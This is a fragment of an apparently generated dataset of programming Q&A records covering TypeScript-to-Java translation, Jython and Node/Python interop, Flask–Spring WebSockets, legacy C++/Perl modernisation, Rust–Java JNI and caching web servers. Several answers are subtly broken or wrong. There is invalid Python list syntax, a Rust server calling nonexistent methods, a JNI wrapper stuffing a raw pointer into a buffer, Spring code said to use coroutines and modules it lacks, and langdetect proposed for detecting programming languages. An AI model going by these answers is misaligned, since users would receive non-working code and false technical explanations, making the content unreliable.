= std::chrono::high_resolution_clock::now();\n    auto execution_time = std::chrono::duration_cast<std::chrono::microseconds>(end_time - start_time).count();\n    std::cout << \"Execution time: \" << execution_time << \" microseconds for \" << description << std::endl;\n}\n\nint main() {\n    fibonacci(1000);\n    coroutine_example();\n    return 0;\n}\n```\nQuestion 2: Create a tool that translates TypeScript code with advanced language features such as async/await, modules, and decorators into equivalent Java code using coroutines, Java modules, and AOP (Aspect-Oriented Programming) annotations.\n\n**Concept**: Code Translation (TypeScript to Java)\n\n```typescript\n// TypeScript Code with advanced features\nimport { log } from './logger';\n\n@log\nasync function fetchUser(userId: number): Promise<User> {\n  const response = await fetch(`https://api.example.com/users/${userId}`);\n  return response.json();\n}\n\nexport async function main() {\n  const user = await fetchUser(1);\n  console.log(user);\n}\n```\n\n**Java Code using coroutines, Java modules, and AOP**\n\n```java\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport org.springframework.scheduling.annotation.EnableAsync;\nimport org.springframework.stereotype.Component;\nimport org.springframework.web.reactive.function.client.WebClient;\nimport reactor.core.publisher.Mono;\n\nimport javax.annotation.PostConstruct;\nimport javax.annotation.PreDestroy;\nimport java.util.function.Consumer;\n\n@SpringBootApplication\n@EnableAsync\npublic class Application {\n    public static void main(String[] args) {\n        SpringApplication.run(Application.class, args);\n    }\n}\n\n@Component\nclass UserRepository {\n    private final WebClient client = WebClient.create(\"https://api.example.com\");\n\n    @Log\n    public Mono<User> fetchUser(int userId) {\n        return client.get()\n                .uri(\"/users/{userId}\", userId)\n                .retrieve()\n                .bodyToMono(User.class);\n    }\n}\n\n@Component\nclass MainService {\n    private final UserRepository userRepository;\n\n    @Autowired\n    public MainService(UserRepository userRepository) {\n        this.userRepository = userRepository;\n    }\n\n    @PostConstruct\n    public void init() {\n        userRepository.fetchUser(1)\n                .subscribe(user -> System.out.println(user));\n    }\n}\n\n@Aspect\n@Component\nclass LoggingAspect {\n    @Around(\"@annotation(Log)\")\n    public Object logAround(ProceedingJoinPoint joinPoint) throws Throwable {\n        System.out.println(\"Starting \" + joinPoint.getSignature().getName());\n        long start = System.currentTimeMillis();\n        Object result = joinPoint.proceed();\n        long elapsedTime = System.currentTimeMillis() - start;\n        System.out.println(\"Finished \" + joinPoint.getSignature().getName() + \" in \" + elapsedTime + \"ms\");\n        return result;\n    }\n}\n\nclass User {\n    // User class attributes and methods\n}\n```\nNote: The Java code uses Spring Framework to enable async functionality, manage dependencies, and implement AOP. The TypeScript code is translated into Java using Spring's WebClient for API calls, coroutines through the `Mono` type, Java modules, and AOP for logging."}, {"L2_TASK": "Code to Code (different languages)", "L3_TASK": "Cross-language API usage", "Complexity_Level": "medium", "Response": "Question 1: Develop a Python script that calls a function implemented in a Java library using Jython and returns the result.\n\nProblem: You have a Java library `MathOperations.jar` that contains a class `MathOperations` with a method `addNumbers(int a, int b)` which adds two integers. You need to call this function from a Python script using Jython.\n\nSolution:\n```python\n# Import necessary libraries\nfrom org.MathOperations import MathOperations\n\n# Create an instance of the MathOperations class\nmathOps = MathOperations()\n\n# Define the numbers to be added\nnum1 = 5\nnum2 = 10\n\n# Call the Java method using Jython\nresult = mathOps.addNumbers(num1, num2)\n\n# Print the result\nprint(f\"The sum is: {result}\")\n```\nIn this example, we are using Jython, a Python implementation that allows the use of Java classes and libraries. We import the `MathOperations` class from the JAR file, create an instance, and call the `addNumbers` method.\n\nQuestion 2: Create a Node.js application that communicates with a Python script using `child_process` module, invoking a function to calculate the factorial of a number.\n\nProblem: You have a Python script `factorial.py` with a function `factorial(n)` that calculates the factorial of a given number. You need to create a Node.js application that calls this Python script, passing a number and displaying the result.\n\nSolution:\n```javascript\n// Import child_process module\nconst { exec } = require('child_process');\n\n// Function to call the Python script and calculate factorial\nfunction calculateFactorial(num) {\n  exec(`python factorial.py ${num}`, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Execution error: ${error}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`stderr: ${stderr}`);\n      return;\n    }\n    // Print the factorial value from the Python script\n    console.log(`The factorial of ${num} is ${stdout}`);\n  });\n}\n\n// Example usage\ncalculateFactorial(5);\n```\nIn this Node.js application, we use the `child_process` module's `exec` function to run the Python script `factorial.py` with the input number as a command-line argument. The Python script should handle input and output through standard input/output. The result is then printed to the console.\n\nConcept: Cross-language API usage"}, {"L2_TASK": "Code to Code (different languages)", "L3_TASK": "Cross-language API usage", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a cross-language solution that integrates a Python Flask API with a Java Spring Boot API, ensuring secure authentication and real-time data synchronization between the two services using WebSockets.\n\n**Problem:**\nYou need to create a bidirectional communication channel between a Python Flask API and a Java Spring Boot API. The system should authenticate users using OAuth2 and maintain real-time data synchronization through WebSockets. Both APIs should be able to send and receive updates to a shared resource, such as a user's status.\n\n**Solution:**\n\n1. Python (Flask API with WebSocket and OAuth2)\n\nFirst, install the required libraries:\n```bash\npip install flask flask-oauthlib websockets\n```\nPython Flask API code:\n```python\nfrom flask import Flask, request, jsonify\nfrom flask_oauthlib.client import OAuth\nimport asyncio\nimport websockets\n\napp = Flask(__name__)\noauth = OAuth(app)\n\n# Setup your OAuth client credentials\ngoogle = oauth.remote_app(\n    'google',\n    consumer_key='your_client_id',\n    consumer_secret='your_client_secret',\n    request_token_params={'scope': 'email'},\n    base_url='https://accounts.google.com/o/oauth2/',\n    request_token_url=None,\n    access_token_method='POST',\n    access_token_url='https://accounts.google.com/o/oauth2/token',\n    authorize_url='https://accounts.google.com/o/oauth2/auth'\n)\n\n@app.route('/')\ndef index():\n    return \"Hello, Flask!\"\n\n@app.route('/login')\ndef login():\n    return google.authorize(callback=url_for('oauth_authorized',\n                                             _external=True))\n\n@app.route('/login/authorized')\n@google.authorized_handler\ndef oauth_authorized(resp):\n    if resp is None:\n        return 'Access denied: reason=%s error=%s' % (\n            request.args['error_reason'],\n            request.args['error_description']\n        )\n    flask.session['oauth_token'] = (resp['access_token'], '')\n    return 'You were authenticated with Google!'\n\nasync def send_data_to_java(data):\n    async with websockets.connect('ws://java-api-host:port') as websocket:\n        await websocket.send(data)\n        response = await websocket.recv()\n        return response\n\nif __name__ == '__main__':\n    app.run()\n```\n1. Java (Spring Boot API with WebSocket and OAuth2)\n\nFirst, add the required dependencies to your `pom.xml`:\n```xml\n<dependencies>\n    ...\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-security</artifactId>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-websocket</artifactId>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.security.oauth.boot</groupId>\n        <artifactId>spring-security-oauth2-autoconfigure</artifactId>\n        <version>2.5.1.RELEASE</version>\n    </dependency>\n</dependencies>\n```\nJava Spring Boot API code:\n```java\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.security.oauth2.client.OAuth2ClientContext;\nimport org.springframework.security.oauth2.client.OAuth2RestTemplate;\nimport org.springframework.security.oauth2.client.resource.OAuth2ProtectedResourceDetails;\nimport org.springframework.security.oauth2.config.annotation.web.configuration.EnableOAuth2Client;\nimport org.springframework.web.bind.annotation.*;\nimport org.springframework.web.socket.WebSocketHandler;\nimport org.springframework.web.socket.config.annotation.EnableWebSocket;\nimport org.springframework.web.socket.config.annotation.WebSocketConfigurer;\nimport org.springframework.web.socket.server.standard.ServletServerContainerFactoryBean;\nimport org.springframework.web.socket.server.support.HttpSessionHandshakeInterceptor;\n\nimport javax.servlet.http.HttpSession;\nimport java.util.concurrent.CopyOnWriteArraySet;\n\n@SpringBootApplication\n@EnableWebSocket\n@EnableOAuth2Client\npublic class WebSocketApplication implements WebSocketConfigurer {\n\n    private final CopyOnWriteArraySet<WebSocketHandler> handlers = new CopyOnWriteArraySet<>();\n\n    @Autowired\n    private OAuth2RestTemplate googleOAuth2RestTemplate;\n\n    @Bean\n    public ServletServerContainerFactoryBean createWebSocketContainer() {\n        ServletServerContainerFactoryBean container = new ServletServerContainerFactoryBean();\n        container.setMaxTextMessageBufferSize(8192);\n        return container;\n    }\n\n    @Override\n    public void registerWebSocketHandlers(WebSocketHandlerRegistry registry) {\n        registry.addHandler(statusWebSocketHandler(), \"/statusWebSocket\")\n                .addInterceptors(new HttpSessionHandshakeInterceptor());\n    }\n\n    @PostMapping(\"/send-to-python\")\n    public void sendToPython(@RequestBody String data, HttpSession session) {\n        // Extract OAuth2 token from session\n        String accessToken = (String) session.getAttribute(\"access_token\");\n\n        // Set the OAuth2 access token in the request headers\n        Map<String, String> headers = new HashMap<>();\n        headers.put(\"Authorization\", \"Bearer \" + accessToken);\n\n        // Send data to Python API using OAuth2 token\n        googleOAuth2RestTemplate.getForObject(\"http://python-api-host:port\", String.class, headers);\n    }\n\n    @WebSocketHandler\n    public WebSocketHandler statusWebSocketHandler() {\n        return new WebSocketHandler() {\n            // Implement WebSocket logic\n        };\n    }\n\n    public static void main(String[] args) {\n        SpringApplication.run(WebSocketApplication.class, args);\n    }\n}\n```\nThis solution demonstrates a complex integration between a Python Flask API and a Java Spring Boot API, using OAuth2 for authentication and WebSockets for real-time data synchronization. The Python API has a login route for Google authentication, while the Java API uses Spring Security for OAuth2 client setup. Both APIs can send data to each other using the OAuth2 access token shared in the user's session.\n\n**Concept: Cross-language API usage**"}, {"L2_TASK": "Code to Code (different languages)", "L3_TASK": "Legacy code modernization", "Complexity_Level": "medium", "Response": "Question 1: Migrating a legacy C++ application to C# with dependency injection\n\nProblem: A legacy C++ application has a monolithic design with tightly coupled components. The goal is to modernize the code by migrating it to C#, introducing dependency injection for better maintainability and testability.\n\nSolution Concept: Legacy Code Modernization, Dependency Injection, Language Migration\n\nExample C# code:\n\n```csharp\n// Interface for the legacy dependency\npublic interface ILegacyDependency\n{\n    void PerformLegacyTask();\n}\n\n// Adapter class for the legacy C++ dependency\npublic class LegacyDependencyAdapter : ILegacyDependency\n{\n    [DllImport(\"legacy_dll.dll\")]\n    private static extern void PerformLegacyTaskCpp();\n\n    public void PerformLegacyTask()\n    {\n        PerformLegacyTaskCpp();\n    }\n}\n\n// Service class using the dependency\npublic class ModernizedService\n{\n    private readonly ILegacyDependency _dependency;\n\n    public ModernizedService(ILegacyDependency dependency)\n    {\n        _dependency = dependency;\n    }\n\n    public void ExecuteModernTask()\n    {\n        _dependency.PerformLegacyTask();\n        // Perform additional modernized tasks\n    }\n}\n\n// In the Composition Root\nvar service = new ModernizedService(new LegacyDependencyAdapter());\nservice.ExecuteModernTask();\n```\n\nQuestion 2: Refactoring Python code with global variables to an object-oriented design\n\nProblem: A legacy Python script uses global variables for sharing data, which makes it hard to maintain. The aim is to refactor it into an object-oriented structure to improve encapsulation and modularity.\n\nSolution Concept: Legacy Code Modernization, Object-Oriented Design, Encapsulation\n\nExample Python code:\n\n```python\n# Legacy code with global variables\ndata = {}\n\ndef process_input(input_data):\n    global data\n    data = input_data\n\ndef calculate_results():\n    global data\n    result = data['value1'] + data['value2']\n    return result\n\n# Refactored code using object-oriented approach\nclass LegacyDataProcessor:\n    def __init__(self, input_data):\n        self.data = input_data\n\n    def calculate_results(self):\n        result = self.data['value1'] + self.data['value2']\n        return result\n\ninput_data = {'value1': 10, 'value2': 20}\nprocessor = LegacyDataProcessor(input_data)\nprint(processor.calculate_results())\n```\n\nThese examples demonstrate how to modernize legacy code by introducing design patterns like dependency injection in C# and using object-oriented design in Python. This leads to more maintainable, testable, and modular code."}, {"L2_TASK": "Code to Code (different languages)", "L3_TASK": "Legacy code modernization", "Complexity_Level": "extremely difficult", "Response": "Question 1: Migrating a legacy monolithic C++ application to a modern microservices architecture using Docker and Kubernetes.\n\nProblem:\nA large, monolithic C++ application has been in operation for decades and is becoming increasingly difficult to maintain and scale. The application needs to be refactored into a microservices architecture to improve modularity, scalability, and maintainability. The new architecture should utilize Docker containers and Kubernetes for orchestration.\n\nSolution:\n1. Decompose the monolithic application into smaller, independent services.\n2. Containerize each microservice using Docker.\n3. Implement Kubernetes for service discovery, scaling, and deployment.\n\nExample code (Dockerfile for a microservice):\n\n```Dockerfile\n# Use an official C++ runtime as a parent image\nFROM mcr.microsoft.com/vscode/devcontainers/cpp:0-ubuntu-20.04\n\n# Set the working directory\nWORKDIR /app\n\n# Copy the C++ source files\nCOPY src src\nCOPY Makefile .\n\n# Build the C++ application\nRUN make\n\n# Expose the required port for the service\nEXPOSE 8080\n\n# Run the service when the container starts\nCMD [\"./app\"]\n```\n\nExample code (Kubernetes deployment YAML):\n\n```yaml\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: my-microservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: my-microservice\n  template:\n    metadata:\n      labels:\n        app: my-microservice\n    spec:\n      containers:\n      - name: my-microservice\n        image: myregistry/my-microservice:latest\n        ports:\n        - containerPort: 8080\n\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: my-microservice\nspec:\n  selector:\n    app: my-microservice\n  ports:\n    - protocol: TCP\n      port: 80\n      targetPort: 8080\n  type: LoadBalancer\n```\n\nQuestion 2: Converting a Perl-based legacy web application to a modern TypeScript application with a React frontend and a Node.js backend.\n\nProblem:\nAn old Perl-based web application needs to be modernized to improve developer productivity, code maintainability, and user experience. The new application should have a React frontend built with TypeScript for better type safety, and a Node.js backend for API handling.\n\nSolution:\n1. Design the new application's architecture and API contracts.\n2. Develop the TypeScript-based React frontend.\n3. Implement the Node.js backend for handling API requests and connecting to the existing data storage.\n\nExample code (TypeScript React component):\n\n```typescript\nimport React, { useState, useEffect } from 'react';\nimport axios from 'axios';\n\ninterface MyData {\n  id: number;\n  name: string;\n}\n\nconst MyComponent: React.FC = () => {\n  const [data, setData] = useState<MyData[]>([]);\n\n  useEffect(() => {\n    axios.get('/api/data')\n      .then(response => {\n        setData(response.data);\n      })\n      .catch(error => {\n        console.error('Error fetching data:', error);\n      });\n  }, []);\n\n  return (\n    <div>\n      {data.map(item => (\n        <div key={item.id}>{item.name}</div>\n      ))}\n    </div>\n  );\n};\n\nexport default MyComponent;\n```\n\nExample code (Node.js backend API):\n\n```javascript\nconst express = require('express');\nconst app = express();\nconst port = 3000;\n\napp.use(express.json());\n\n// Connect to existing data storage (e.g., a Perl script or database)\n\napp.get('/api/data', async (req, res) => {\n  try {\n    const data = await fetchDataFromLegacySystem(); // Replace with actual function\n    res.status(200).json(data);\n  } catch (error) {\n    res.status(500).send('Error fetching data');\n  }\n});\n\napp.listen(port, () => {\n  console.log(`Server running at http://localhost:${port}`);\n});\n```\n\nConcepts Picked:\n1. {\"Concept\": \"Microservices\"}\n2. {\"Concept\": \"Docker\"}\n3. {\"Concept\": \"Kubernetes\"}\n4. {\"Concept\": \"TypeScript\"}\n5. {\"Concept\": \"React\"}\n6. {\"Concept\": \"Node.js\"}"}, {"L2_TASK": "Code to Code (different languages)", "L3_TASK": "Interoperability solutions", "Complexity_Level": "medium", "Response": "Question 1: Implement a function in Python that calls a JavaScript function defined in a separate file and returns the result to Python.\n\n**Concept**: Interoperability between Python and JavaScript\n\n**Solution**:\nIn this solution, we use the `nodejs` package in Python to run a JavaScript file and get the result.\n\n1. Create a JavaScript file `calculator.js`:\n\n```javascript\nfunction add(a, b) {\n  return a + b;\n}\n\nmodule.exports = {\n  add: add\n};\n```\n\n2. Create a Python file `python_script.py`:\n\n```python\nimport subprocess\nimport json\n\ndef run_javascript(js_file, args):\n    js_function = args.pop('function')\n    js_code = f'require(\"{js_file}\"); return {js_function}({\" \".join(args)})'\n    result = subprocess.check_output(['node', '-e', js_code])\n    return json.loads(result.decode('utf-8'))\n\n# Call JavaScript function from Python\nresult = run_javascript('calculator.js', ['function': 'add', '2', '3'])\nprint(f\"Result: {result}\")\n```\n\n**Explanation**: The Python script uses the `subprocess` module to run a Node.js instance with the JavaScript code. The JavaScript code imports the required function from the `calculator.js` file and executes it with the passed arguments. The result is then returned to Python and printed.\n\nQuestion 2: Write a Java program that calls a REST API (implemented in Python Flask) to fetch data and process it.\n\n**Concept**: Interoperability between Java and Python (Web Services)\n\n**Solution**:\n1. Create a Python Flask API `app.py`:\n\n```python\nfrom flask import Flask, jsonify\nimport time\n\napp = Flask(__name__)\n\n@app.route('/data', methods=['GET'])\ndef get_data():\n    data = {\n        'timestamp': int(time.time()),\n        'message': 'Data fetched from Python API'\n    }\n    return jsonify(data)\n\nif __name__ == '__main__':\n    app.run(debug=True, host='0.0.0.0')\n```\n\n2. Create a Java program `JavaClient.java`:\n\n```java\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport org.json.JSONObject;\n\npublic class JavaClient {\n    public static void main(String[] args) {\n        try {\n            // Define the REST API endpoint URL\n            String apiUrl = \"http://localhost:5000/data\";\n\n            // Create a URL object\n            URL url = new URL(apiUrl);\n\n            // Open a connection to the API\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            connection.setRequestProperty(\"Accept\", \"application/json\");\n\n            // Read the response\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            StringBuilder response = new StringBuilder();\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                response.append(inputLine);\n            }\n            in.close();\n\n            // Parse the JSON response\n            JSONObject jsonResponse = new JSONObject(response.toString());\n            long timestamp = jsonResponse.getLong(\"timestamp\");\n            String message = jsonResponse.getString(\"message\");\n\n            // Process the data\n            System.out.println(\"Timestamp: \" + timestamp);\n            System.out.println(\"Message: \" + message);\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n**Explanation**: The Java program uses `HttpURLConnection` to send a GET request to the Python Flask API, which returns a JSON response. The Java program then parses the JSON and prints the fetched data."}, {"L2_TASK": "Code to Code (different languages)", "L3_TASK": "Interoperability solutions", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a complex application that integrates a C++ module for high-performance computing with a Python-based machine learning model, ensuring seamless data exchange and interoperability between the two. The C++ module should perform computationally intensive tasks, while Python should handle the dynamic training and updating of the model. The application should utilize IPC mechanisms for efficient communication.\n\nSolution using Python and C++ with `ctypes` library for interoperability:\n```cpp\n// hello.cpp (C++ module)\n#include <iostream>\n\nextern \"C\" {\n    // Declare a function to perform a complex computation\n    double compute(int a, int b) {\n        // Perform a complex calculation\n        double result = static_cast<double>(a * b) / std::sqrt(a + b);\n        return result;\n    }\n}\n```\n```cpp\n// compile the C++ module as a shared library (Linux)\ng++ -shared -o libhello.so -fPIC hello.cpp\n\n// compile the C++ module as a shared library (Windows)\ng++ -shared -o libhello.dll -fPIC hello.cpp\n```\n```python\n# main.py (Python script)\nimport ctypes\nimport numpy as np\nfrom sklearn.linear_model import LinearRegression\n\n# Load the C++ shared library\nif os.name == 'nt':\n    lib = ctypes.cdll.LoadLibrary('libhello.dll')\nelse:\n    lib = ctypes.cdll.LoadLibrary('libhello.so')\n\n# Define function prototypes and data types\nlib.compute.argtypes = [ctypes.c_int, ctypes.c_int]\nlib.compute.restype = ctypes.c_double\n\n# Initialize the machine learning model\nmodel = LinearRegression()\n\n# Perform the computation and training\ndata = np.random.randint(1, 100, size=(100, 2))\nlabels = np.random.randint(1, 100, size=100)\n\n# Call the C++ function for complex computation\ninputs = np.array([50, 75], dtype=np.intc)\nresult = lib.compute(inputs[0], inputs[1])\n\n# Use the computed value to update the input data\nupdated_data = np.concatenate((data, np.array(result).reshape(-1, 1)), axis=1)\n\n# Train the model with the updated data\nmodel.fit(updated_data, labels)\n\nprint(f\"Computed result: {result}\")\nprint(f\"Trained model coefficients: {model.coef_}\")\n```\nConcept: Interoperability Solutions\n\nQuestion 2: Implement a Rust library for image processing algorithms and create a Java wrapper around it to enable usage in a Java-based image processing application. The Rust library should expose complex image transformation methods, and the Java wrapper should handle memory management and data conversion between the two languages.\n\nSolution using Rust and Java with `jni` library for interoperability:\n```rust\n// rust_image_processing/src/lib.rs (Rust library)\n#[no_mangle]\npub extern \"C\" fn rust_process_image(image_ptr: *const u8, image_len: usize, width: u32, height: u32) -> *mut u8 {\n    // Perform image processing\n    // ...\n    let processed_image = process_image(image_ptr, image_len, width, height);\n\n    // Allocate memory for the processed image\n    let mut processed_image_ptr = std::alloc::alloc(std::alloc::Layout::from_size_align(processed_image.len(), 1).unwrap());\n    std::ptr::copy(processed_image.as_ptr(), processed_image_ptr, processed_image.len());\n\n    processed_image_ptr\n}\n```\n```java\n// Java wrapper (Java code)\nimport java.nio.ByteBuffer;\nimport java.nio.ByteOrder;\n\npublic class RustImageProcessor {\n    static {\n        System.loadLibrary(\"rust_image_processing\");\n    }\n\n    public native long processImage(byte[] image, int width, int height);\n\n    public ByteBuffer processImageAndReturnBuffer(byte[] image, int width, int height) {\n        long resultPtr = processImage(image, width, height);\n        if (resultPtr == 0) {\n            return null;\n        }\n\n        // Create a direct ByteBuffer from the native pointer\n        ByteBuffer buffer = ByteBuffer.allocateDirect(width * height * 4).order(ByteOrder.BIG_ENDIAN);\n        buffer.asLongBuffer().put(resultPtr);\n\n        return buffer;\n    }\n}\n```\nConcept: Interoperability Solutions"}, {"L2_TASK": "Code to Code (different languages)", "L3_TASK": "Scripting to compiled code conversion", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: You are working on a script that uses Python to fetch some data from an API and perform basic calculations. The script needs to be converted to a compiled language like C++ for better performance and integration into an existing C++ application.\n\nConcept: Scripting to compiled code conversion\n\nSolution:\nIn Python (scripting language):\n```python\nimport requests\n\ndef fetch_data(api_url):\n    response = requests.get(api_url)\n    data = response.json()\n    return data\n\ndef calculate_average(data):\n    total = sum(d['value'] for d in data)\n    avg = total / len(data)\n    return avg\n\napi_url = \"https://api.example.com/data\"\ndata = fetch_data(api_url)\naverage = calculate_average(data)\nprint(f\"Average value: {average}\")\n```\nIn C++ (compiled language):\n```cpp\n#include <iostream>\n#include <vector>\n#include <string>\n#include <curl/curl.h>\n#include <nlohmann/json.hpp>\n\nusing json = nlohmann::json;\n\nsize_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userp) {\n    size_t total_size = size * nmemb;\n    userp->append((char*)contents, total_size);\n    return total_size;\n}\n\njson fetch_data(const std::string& api_url) {\n    CURL* curl = curl_easy_init();\n    if (curl) {\n        curl_easy_setopt(curl, CURLOPT_URL, api_url.c_str());\n        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);\n        std::string response_data;\n        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);\n        CURLcode res = curl_easy_perform(curl);\n        curl_easy_cleanup(curl);\n        if (res == CURLE_OK) {\n            return json::parse(response_data);\n        } else {\n            throw std::runtime_error(\"Failed to fetch data\");\n        }\n    }\n    throw std::runtime_error(\"Failed to initialize cURL\");\n}\n\ndouble calculate_average(const std::vector<json>& data) {\n    double total = 0;\n    for (const auto& d : data) {\n        total += d[\"value\"];\n    }\n    return total / data.size();\n}\n\nint main() {\n    std::string api_url = \"https://api.example.com/data\";\n    try {\n        json data = fetch_data(api_url);\n        double average = calculate_average(data.get<std::vector<json>>());\n        std::cout << \"Average value: \" << average << std::endl;\n    } catch (const std::exception& e) {\n        std::cerr << \"Error: \" << e.what() << std::endl;\n    }\n    return 0;\n}\n```\nQuestion 2:\nProblem: You have a JavaScript script that manipulates DOM elements and performs some client-side calculations. This script needs to be converted into a Java program for use in a desktop application.\n\nConcept: Scripting to compiled code conversion\n\nSolution:\nIn JavaScript (scripting language):\n```javascript\ndocument.getElementById('result').innerText = 'Hello, World!';\n\nfunction calculateSum(a, b) {\n    return a + b;\n}\n\nlet num1 = parseInt(prompt('Enter first number:'));\nlet num2 = parseInt(prompt('Enter second number:'));\ndocument.getElementById('result').innerText = calculateSum(num1, num2);\n```\nIn Java (compiled language) using JavaFX:\n```java\nimport javafx.application.Application;\nimport javafx.scene.Scene;\nimport javafx.scene.control.Button;\nimport javafx.scene.control.Label;\nimport javafx.scene.control.TextField;\nimport javafx.scene.layout.VBox;\nimport javafx.stage.Stage;\n\npublic class DOMSimulation extends Application {\n\n    private Label resultLabel = new Label();\n    private TextField num1Field = new TextField();\n    private TextField num2Field = new TextField();\n    private Button calculateButton = new Button(\"Calculate\");\n\n    public static void main(String[] args) {\n        launch(args);\n    }\n\n    @Override\n    public void start(Stage primaryStage) {\n        calculateButton.setOnAction(event -> {\n            try {\n                int num1 = Integer.parseInt(num1Field.getText());\n                int num2 = Integer.parseInt(num2Field.getText());\n                int sum = calculateSum(num1, num2);\n                resultLabel.setText(\"Sum: \" + sum);\n            } catch (NumberFormatException e) {\n                resultLabel.setText(\"Invalid input. Please enter numbers.\");\n            }\n        });\n\n        VBox root = new VBox(10, new Label(\"Enter numbers:\"), num1Field, num2Field, calculateButton, resultLabel);\n        Scene scene = new Scene(root, 300, 200);\n        primaryStage.setTitle(\"DOM Simulation\");\n        primaryStage.setScene(scene);\n        primaryStage.show();\n    }\n\n    private int calculateSum(int a, int b) {\n        return a + b;\n    }\n}\n```\nNote: For the JavaFX application to run, you'll need to have the JavaFX library included in your project setup."}, {"L2_TASK": "Code to Code (different languages)", "L3_TASK": "Scripting to compiled code conversion", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nCreating a complex, high-performance, and concurrent web server in both Python (scripting language) and Rust (compiled language) for converting dynamic web pages into static HTML. The server must handle a large number of concurrent requests, cache the generated static pages, and use an efficient algorithm to minimize regeneration of the same content.\n\nSolution for Python (using `uvicorn` and `fastapi`):\n```python\nfrom fastapi import FastAPI, HTTPException\nfrom starlette.responses import HTMLResponse\nimport hashlib\nimport os\nimport time\n\napp = FastAPI()\n\nCACHE_DIR = './cache'\n\n@app.middleware(\"http\")\nasync def cache_middleware(request, call_next):\n    path = request.url.path\n    hashed_path = hashlib.sha256(path.encode()).hexdigest()\n\n    cache_file = os.path.join(CACHE_DIR, hashed_path + \".html\")\n    if os.path.exists(cache_file) and os.path.getmtime(cache_file) > time.time() - 60:\n        with open(cache_file, 'rb') as f:\n            return HTMLResponse(content=f.read(), status_code=200)\n\n    response = await call_next(request)\n    if response.status_code == 200 and 'text/html' in response.headers.get('content-type', ''):\n        with open(cache_file, 'wb') as f:\n            f.write(response.content)\n    return response\n\n@app.get(\"/{path:path}\")\nasync def serve_static(path: str):\n    return \"This is a dynamically generated page\"\n\nif __name__ == \"__main__\":\n    os.makedirs(CACHE_DIR, exist_ok=True)\n    import uvicorn\n    uvicorn.run(app, host=\"0.0.0.0\", port=8000)\n```\nSolution for Rust (using `hyper` and `tokio`):\n```rust\nuse std::fs::{File, create_dir_all};\nuse std::io::{BufRead, BufReader};\nuse std::path::Path;\nuse std::time::SystemTime;\nuse hyper::service::{make_service_fn, service_fn};\nuse hyper::{Body, Method, Request, Response, Server};\nuse hyper::http::uri::PathAndQuery;\nuse tokio::fs;\nuse tokio::sync::RwLock;\n\n#[tokio::main]\nasync fn main() {\n    let cache_dir = \"./cache\";\n    create_dir_all(cache_dir).unwrap();\n\n    let cache = RwLock::new(Vec::new());\n\n    let make_svc = make_service_fn(|_conn| {\n        async move {\n            Ok::<_, hyper::Error>(service_fn(move |req| {\n                handle_request(req, &cache).boxed()\n            }))\n        }\n    });\n\n    let addr = ([127, 0, 0, 1], 8000).into();\n    Server::bind(&addr).serve(make_svc).await.unwrap();\n}\n\nasync fn handle_request(req: Request<Body>, cache: &RwLock<Vec<(String, u64)>>) -> Result<Response<Body>, hyper::Error> {\n    let path_and_query = req.uri.path_and_query();\n    let path = match path_and_query {\n        Some(path_and_query) => path_and_query.into_path(),\n        None => return Ok(Response::new(Body::empty())),\n    };\n\n    let hashed_path = path.to_string().sha256();\n    let mut cache = cache.write().await;\n\n    let cached_entry = cache.iter().find(|&(ref p, _)| p == &hashed_path);\n    let cached_time = match cached_entry {\n        Some((&_, t)) => t,\n        None => 0,\n    };\n\n    let now = SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).unwrap().as_secs();\n\n    if now - cached_time < 60 {\n        let response = Response::new(Body::empty());\n        response.status = 200;\n        return Ok(response);\n    }\n\n    let response = match (req.method(), path) {\n        (Method::GET, _) => Response::new(Body::from(\"This is a dynamically generated page\")),\n        _ => Response::new(Body::empty()).into(),\n    };\n\n    match response.status {\n        200 => {\n            let content = String::from_utf8_lossy(response.body()).to_string();\n            let file_path = Path::new(&cache_dir).join(&hashed_path);\n            fs::write(file_path, content).await.unwrap();\n            cache.push((hashed_path, now));\n        },\n        _ => {}\n    }\n\n    Ok(response)\n}\n\nfn sha256(s: &str) -> String {\n    use std::convert::TryInto;\n    use std::hash::{Hasher, SipHasher};\n    let mut sip = SipHasher::new_with_keys(0, 0);\n    sip.write(s.as_bytes());\n    format!(\"{:x}\", sip.finish().try_into().unwrap())\n}\n```\nConcept: Scripting to compiled code conversion"}, {"L2_TASK": "Code to Code (different languages)", "L3_TASK": "Automatic code localization", "Complexity_Level": "medium", "Response": "Question 1: Develop a script in Python that automatically identifies the programming language used in a given snippet of code by utilizing a pre-trained model or library.\n\nConcept: \"Code Localization\"\n\nSolution:\nTo achieve this, we can use the `langdetect` library in Python, which is designed to detect the language of a given text. It uses a Naive Bayes classifier trained on Wikipedia data.\n\nFirst, you need to install the `langdetect` library:\n```bash\npip install langdetect\n```\nNext, create a Python script called `code_localizer.py`:\n```python\nfrom langdetect import detect\n\ndef detect_code_language(code_snippet):\n    try:\n        detected_lang = detect(code_snippet)\n        return detected_lang\n    except Exception as e:\n        return f\"Error: {str(e)}\"\n\n# Example usage\ncode_snippet = \"\"\"\npublic class HelloWorld {\n    public static void 